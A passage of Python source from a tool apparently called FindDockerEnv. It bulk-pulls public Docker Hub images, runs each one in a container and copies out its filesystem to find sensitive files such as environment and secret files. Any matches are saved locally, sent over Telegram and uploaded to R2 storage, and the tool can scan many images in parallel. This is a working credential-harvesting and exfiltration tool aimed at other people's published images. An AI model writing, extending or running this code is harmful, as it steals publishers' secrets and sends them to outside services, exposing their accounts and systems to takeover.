    if sequence_number == 1:
        return image_dir / original_name

    source = Path(original_name)
    return image_dir / f"{source.stem}_{sequence_number}{source.suffix}"


def copy_found_files(found_paths: list[Path], root_dir: Path, result_dir: Path, image: str) -> list[Path]:
    result_dir.mkdir(parents=True, exist_ok=True)
    image_dir = result_dir / make_safe_image_name(image)
    image_dir.mkdir(parents=True, exist_ok=True)
    saved_paths: list[Path] = []
    used_names: dict[str, int] = {}

    for path in found_paths:
        base_name = path.name
        used_names[base_name] = used_names.get(base_name, 0) + 1
        destination = build_flat_destination(image_dir, base_name, used_names[base_name])
        shutil.copy2(path, destination)
        saved_paths.append(destination)

    return saved_paths


def scan_repository(
    candidate: RepositoryCandidate,
    start_timeout: float,
    keep_temp: bool,
    result_dir: Path,
    config: AppConfig,
    insecure: bool,
) -> ScanResult:
    container_name = f"find-docker-env-{uuid.uuid4().hex[:12]}"
    temp_dir_path = Path(tempfile.mkdtemp(prefix=f"find-docker-env-{make_safe_image_name(candidate.image)}-"))
    resolved_image: str | None = None
    resolved_image_id: str | None = None

    try:
        try:
            resolved_image, pull_status, pull_error = choose_pullable_image_reference(
                candidate,
                config=config,
                insecure=insecure,
            )
        except (HTTPError, URLError, TimeoutError, RuntimeError) as exc:
            return ScanResult(
                image=candidate.image,
                pull_count=candidate.pull_count,
                temp_dir=temp_dir_path if keep_temp else None,
                files_copied=False,
                env_found=False,
                status="tag_resolve_failed",
                error=str(exc),
            )

        if not resolved_image:
            return ScanResult(
                image=candidate.image,
                pull_count=candidate.pull_count,
                temp_dir=temp_dir_path if keep_temp else None,
                files_copied=False,
                env_found=False,
                status=pull_status or "pull_failed",
                error=pull_error,
            )

        create_result = run_command(
            ["docker", "create", "--label", MANAGED_CONTAINER_LABEL, "--name", container_name, resolved_image],
            check=False,
        )
        if create_result.returncode != 0:
            error = create_result.stderr.strip() or create_result.stdout.strip() or "docker create failed"
            return ScanResult(
                image=resolved_image,
                pull_count=candidate.pull_count,
                temp_dir=temp_dir_path if keep_temp else None,
                files_copied=False,
                env_found=False,
                status="create_failed",
                error=error,
            )

        resolved_image_id = inspect_container_image_id(container_name)
        if resolved_image_id:
            register_image_usage(resolved_image_id)

        start_result = run_command(["docker", "start", container_name], check=False)
        if start_result.returncode != 0:
            error = start_result.stderr.strip() or start_result.stdout.strip() or "docker start failed"
            return ScanResult(
                image=resolved_image,
                pull_count=candidate.pull_count,
                temp_dir=temp_dir_path if keep_temp else None,
                files_copied=False,
                env_found=False,
                status="start_failed",
                error=error,
            )

        time.sleep(start_timeout)
        run_command(["docker", "stop", "-t", "5", container_name], check=False)

        files_copied, copied_root, copy_error = copy_container_filesystem(container_name, temp_dir_path)
        matched_files = find_sensitive_files(copied_root) if files_copied and copied_root is not None else []
        env_path = matched_files[0] if matched_files else None
        env_found = env_path is not None
        saved_files = (
            copy_found_files(matched_files, copied_root, result_dir, resolved_image)
            if matched_files and copied_root is not None and resolved_image
            else []
        )
        env_saved_to = saved_files[0] if saved_files else None
        if saved_files:
            send_telegram_message(
                config,
                f"Sensitive files found in {resolved_image}: {', '.join(path.name for path in saved_files)}",
            )
            send_telegram_file_groups(config, resolved_image, saved_files)
            upload_files_to_r2(config, resolved_image, saved_files)

        return ScanResult(
            image=resolved_image,
            pull_count=candidate.pull_count,
            temp_dir=temp_dir_path if keep_temp else None,
            files_copied=files_copied,
            env_found=env_found,
            status="ok" if files_copied else "copy_failed",
            env_source=env_path,
            env_saved_to=env_saved_to,
            matched_files=matched_files,
            saved_files=saved_files,
            error=copy_error,
        )
    finally:
        cleanup_container(container_name)
        if resolved_image_id:
            cleanup_image(resolved_image_id)
        if not keep_temp:
            shutil.rmtree(temp_dir_path, ignore_errors=True)


def result_to_dict(result: ScanResult) -> dict[str, Any]:
    return {
        "image": result.image,
        "pull_count": result.pull_count,
        "temp_dir": str(result.temp_dir) if result.temp_dir else None,
        "files_copied": result.files_copied,
        "env_found": result.env_found,
        "status": result.status,
        "env_source": str(result.env_source) if result.env_source else None,
        "env_saved_to": str(result.env_saved_to) if result.env_saved_to else None,
        "matched_files": [str(path) for path in (result.matched_files or [])],
        "saved_files": [str(path) for path in (result.saved_files or [])],
        "error": result.error,
    }


def save_report(results: list[ScanResult], report_file: str) -> None:
    report_path = Path(report_file)
    report_path.parent.mkdir(parents=True, exist_ok=True)

    rows = [result_to_dict(item) for item in results]
    suffix = report_path.suffix.lower()
    if suffix == ".json":
        report_path.write_text(json.dumps(rows, indent=2, ensure_ascii=False), encoding="utf-8")
        return

    if suffix == ".csv":
        fieldnames = [
            "image",
            "pull_count",
            "temp_dir",
            "files_copied",
            "env_found",
            "status",
            "env_source",
            "env_saved_to",
            "matched_files",
            "saved_files",
            "error",
        ]
        with report_path.open("w", encoding="utf-8", newline="") as handle:
            writer = csv.DictWriter(handle, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(rows)
        return

    raise ValueError("Unsupported report file format. Use .json or .csv.")


def print_text_results(results: list[ScanResult]) -> None:
    if not results:
        print("No repositories matched the filters.")
        return

    for result in results:
        print(f"Image: {result.image}")
        print(f"Pull count: {result.pull_count}")
        print(f"Status: {result.status}")
        print(f"Filesystem copied: {'yes' if result.files_copied else 'no'}")
        print(f"Sensitive files found: {'yes' if result.env_found else 'no'}")
        if result.env_source:
            print(f"First match source: {result.env_source}")
        if result.env_saved_to:
            print(f"First match saved to: {result.env_saved_to}")
        if result.matched_files:
            print("Matched files:")
            for path in result.matched_files:
                print(f"  - {path}")
        if result.saved_files:
            print("Saved files:")
            for path in result.saved_files:
                print(f"  - {path}")
        print(f"Temp dir: {result.temp_dir if result.temp_dir else 'removed'}")
        if result.error:
            print(f"Error: {result.error}")
        print("-" * 60)


def scan_repositories(
    candidates: list[RepositoryCandidate],
    start_timeout: float,
    keep_temp: bool,
    workers: int,
    result_dir: Path,
    config: AppConfig,
    ignore_db: bool,
    insecure: bool,
) -> list[ScanResult]:
    total = len(candidates)
    if workers <= 1:
        results: list[ScanResult] = []
        for index, item in enumerate(candidates, start=1):
            result = scan_repository(
                item,
                start_timeout=start_timeout,
                keep_temp=keep_temp,
                result_dir=result_dir,
                config=config,
                insecure=insecure,
            )
            results.append(result)
            if not ignore_db and should_mark_processed(result):
                mark_image_processed(config, item.image, found_sensitive_files=result.env_found)
            print(f"Processed {index}/{total}: {result.image} [{result.status}]", file=sys.stderr)
        return results

    results_by_index: dict[int, ScanResult] = {}
    candidate_by_index = {index: candidate for index, candidate in enumerate(candidates)}
    with ThreadPoolExecutor(max_workers=workers) as executor:
        future_map = {
            executor.submit(scan_repository, candidate, start_timeout, keep_temp, result_dir, config, insecure): index
            for index, candidate in enumerate(candidates)
        }
        processed = 0
        for future in as_completed(future_map):
            result_index = future_map[future]
            result = future.result()
            results_by_index[result_index] = result
            if not ignore_db and should_mark_processed(result):
                mark_image_processed(
                    config,
                    candidate_by_index[result_index].image,
                    found_sensitive_files=result.env_found,
                )
            processed += 1
            print(f"Processed {processed}/{total}: {result.image} [{result.status}]", file=sys.stderr)

    return [results_by_index[index] for index in sorted(results_by_index)]


def print_namespace_probe_results(results: list[dict[str, Any]]) -> None:
    print(json.dumps(results, indent=2, ensure_ascii=False))


def main() -> int:
    args = parse_args()
    config = load_config()
    config.insecure_network = args.insecure

    if args.probe_user_endpoints:
        try:
            results = probe_namespace_endpoints(
                namespace=args.probe_user_endpoints,
                page_size=args.page_size,
                insecure=args.insecure,
            )
        except ssl.SSLCertVerificationError as exc:
            print(
                "TLS certificate verification failed while talking to Docker Hub. "
                "Retry with --insecure if you trust this network/environment.\n"
                f"Details: {exc}",
                file=sys.stderr,
            )
            return 1
        except URLError as exc:
            print(f"Network error while talking to Docker Hub: {exc}", file=sys.stderr)
            return 1

        print_namespace_probe_results(results)
        return 0

    try:
        ensure_docker_available()
        init_db(config)
        start_page = calculate_start_page(args.start_from_index, args.page_size)
        candidates = collect_unprocessed_candidates(
            config=config,
            query=args.query,
            user_images=args.user_images,
            max_pulls=args.max_pulls,
            max_results=args.max_results,
            page_size=args.page_size,
            max_pages=args.max_pages,
            start_page=start_page,
            start_from_index=args.start_from_index,
            start_from_image=args.start_from_image,
            ignore_db=args.ignore_db,
            insecure=args.insecure,
        )
    except ssl.SSLCertVerificationError as exc:
        print(
            "TLS certificate verification failed while talking to Docker Hub. "
            "Retry with --insecure if you trust this network/environment.\n"
            f"Details: {exc}",
            file=sys.stderr,
        )
        return 1
    except URLError as exc:
        reason = getattr(exc, "reason", None)
        if isinstance(reason, ssl.SSLCertVerificationError):
            print(
                "TLS certificate verification failed while talking to Docker Hub. "
                "Retry with --insecure if you trust this network/environment.\n"
                f"Details: {reason}",
                file=sys.stderr,
            )
            return 1
        print(f"Network error while talking to Docker Hub: {exc}", file=sys.stderr)
        return 1
    except (HTTPError, TimeoutError) as exc:
        print(f"Network error while talking to Docker Hub: {exc}", file=sys.stderr)
        return 1
    except RuntimeError as exc:
        print(str(exc), file=sys.stderr)
        return 1

    results = scan_repositories(
        candidates=candidates,
        start_timeout=args.start_timeout,
        keep_temp=args.keep_temp,
        workers=max(args.workers, 1),
        result_dir=Path(args.result_dir),
        config=config,
        ignore_db=args.ignore_db,
        insecure=args.insecure,
    )

    send_telegram_message(
        config,
        f"FindDockerEnv finished. Processed {len(results)} images, found matches in {sum(1 for item in results if item.env_found)} images.",
    )

    if args.report_file:
        try:
            save_report(results, args.report_file)
        except ValueError as exc:
            print(str(exc), file=sys.stderr)
            return 1

    if args.output_json:
        print(json.dumps([result_to_dict(item) for item in results], indent=2, ensure_ascii=False))
    else:
        print_text_results(results)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
